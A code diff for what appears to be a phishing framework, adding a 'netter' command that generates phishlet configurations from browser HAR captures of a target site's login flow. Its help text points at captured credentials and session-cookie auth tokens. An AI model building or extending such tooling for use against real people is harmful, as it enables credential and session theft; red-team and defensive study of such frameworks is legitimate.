@@ -173,6 +173,12 @@ func (t *Terminal) DoWork() {
 			if err != nil {
 				log.Error("stats: %v", err)
 			}
+		case "netter":
+			cmd_ok = true
+			err := t.handleNetter(args[1:])
+			if err != nil {
+				log.Error("netter: %v", err)
+			}
 		case "webhook":
 			cmd_ok = true
 			err := t.handleWebhook(args[1:])
@@ -1641,6 +1647,28 @@ redirections work as expected.`, LAYER_TOP,
 	h.AddCommand("test-certs", "general", "test TLS certificates for active phishlets", "Test availability of set up TLS certificates for active phishlets.", LAYER_TOP,
 		readline.PcItem("test-certs"))
 
+	h.AddCommand("netter", "general", "generate phishlet from HAR file", `Generates a phishlet configuration from a HAR (HTTP Archive) file exported from a browser.
+
+The HAR file should contain a complete authentication flow including login requests and cookie responses.
+
+EXAMPLES:
+  netter generate ~/Downloads/login-session.har    generate phishlet from HAR file
+
+PREREQUISITES:
+  1. Open Chrome DevTools (F12) -> Network tab
+  2. Clear existing requests
+  3. Perform complete login flow on target site
+  4. Right-click in Network tab -> "Save all as HAR with content"
+
+NOTES:
+  - HAR must contain POST requests with credentials
+  - HAR must contain Set-Cookie headers with auth tokens
+  - Generated phishlets may need manual refinement
+  - Interactive prompts will guide cookie and credential selection`, LAYER_TOP,
+		readline.PcItem("netter",
+			readline.PcItem("generate")))
+	h.AddSubCommand("netter", nil, "generate <harfile>", "generate phishlet from HAR file")
+
 	h.AddCommand("clear", "general", "clears the screen", "Clears the screen.", LAYER_TOP,
 		readline.PcItem("clear"))
 
@@ -2193,6 +2221,26 @@ func (t *Terminal) createPhishUrl(base_url string, params *url.Values) string {
 		ret += "?" + key_arg + "=" + key_val
 	}
 	return ret
+}
+
+func (t *Terminal) handleNetter(args []string) error {
+	if len(args) == 0 {
+		return fmt.Errorf("usage: netter generate <harfile.har>")
+	}
+
+	if args[0] != "generate" {
+		return fmt.Errorf("unknown subcommand: %s (available: generate)", args[0])
+	}
+
+	if len(args) < 2 {
+		return fmt.Errorf("usage: netter generate <harfile.har>")
+	}
+
+	harPath := args[1]
+
+	// Create generator and run
+	generator := NewNetterGenerator(t.rl, t.cfg)
+	return generator.Generate(harPath)
 }
 
 func (t *Terminal) sprintVar(k string, v string) string {
